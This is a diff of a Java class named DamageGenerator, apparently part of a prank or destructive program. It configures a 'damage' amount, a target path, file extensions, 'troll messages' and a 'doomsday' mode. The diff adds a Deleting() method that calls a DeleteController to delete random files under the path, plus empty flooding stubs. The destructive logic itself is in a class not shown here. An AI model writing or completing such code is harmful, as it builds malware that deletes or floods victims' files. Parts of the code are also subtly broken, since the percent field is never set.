@@ -1,50 +1,46 @@
 
 package com;
 
-import java.io.BufferedWriter;
 import java.io.File;
-import java.io.FileWriter;
-import java.io.IOException;
-import java.util.ArrayList;
 
 public class DamageGenerator {
-	int damage;
-	String message[], extentions[];
-	File path;
-	boolean random = false, doomsDayMode = false, delete = false;
+	private static int damage, percent;
+	private static String message[], extentions[];
+	private static File path;
+	private static boolean random = false, doomsDayMode = false, delete = false;
 
-	public DamageGenerator(int damage, File path, String extentions[], String trollMessage[], boolean random,
+	public DamageGenerator(int damage, File path, String extentions[], String trollMessage[], boolean random, int percent,
 			boolean doomsday, boolean delete) {
-		this.damage = damage;
-		this.path = path;
-		this.extentions = extentions;
-		this.random = random;
-		this.doomsDayMode = doomsday;
-		this.delete = delete;
-		this.message = trollMessage;
+		DamageGenerator.damage = damage;
+		DamageGenerator.path = path;
+		DamageGenerator.extentions = extentions;
+		DamageGenerator.random = random;
+		DamageGenerator.doomsDayMode = doomsday;
+		DamageGenerator.delete = delete;
+		DamageGenerator.message = trollMessage;
 	}
 
 	public DamageGenerator(int damage, File path, String extentions[], String trollMessage[]) {
-		this.damage = damage;
-		this.path = path;
-		this.extentions = extentions;
-		this.message = trollMessage;
+		DamageGenerator.damage = damage;
+		DamageGenerator.path = path;
+		DamageGenerator.extentions = extentions;
+		DamageGenerator.message = trollMessage;
 	}
 
-	public DamageGenerator(int damage, File path, String extentions[], boolean random, boolean doomsday,
+	public DamageGenerator(int damage, File path, String extentions[], boolean random, int percent, boolean doomsday,
 			boolean delete) {
-		this.damage = damage;
-		this.path = path;
-		this.extentions = extentions;
-		this.random = random;
-		this.doomsDayMode = doomsday;
-		this.delete = delete;
+		DamageGenerator.damage = damage;
+		DamageGenerator.path = path;
+		DamageGenerator.extentions = extentions;
+		DamageGenerator.random = random;
+		DamageGenerator.doomsDayMode = doomsday;
+		DamageGenerator.delete = delete;
 	}
 
 	public DamageGenerator(int damage, File path, String extentions[]) {
-		this.damage = damage;
-		this.path = path;
-		this.extentions = extentions;
+		DamageGenerator.damage = damage;
+		DamageGenerator.path = path;
+		DamageGenerator.extentions = extentions;
 	}
 
 	public void DoDamage() {
@@ -61,11 +57,21 @@ public class DamageGenerator {
 	}
 
 	public static void Deleting() {
-
+		DeleteController deleteController =new DeleteController(path, percent);
+		deleteController.DeleteRandomStuff();
+		
+		if (doomsDayMode== false) {
+			damage*=percent/100;
+		}
+		
 	}
 
 	public static void randomFlooding() {
 
+	}
+	
+	public static void Flood() {
+		
 	}
 
 }
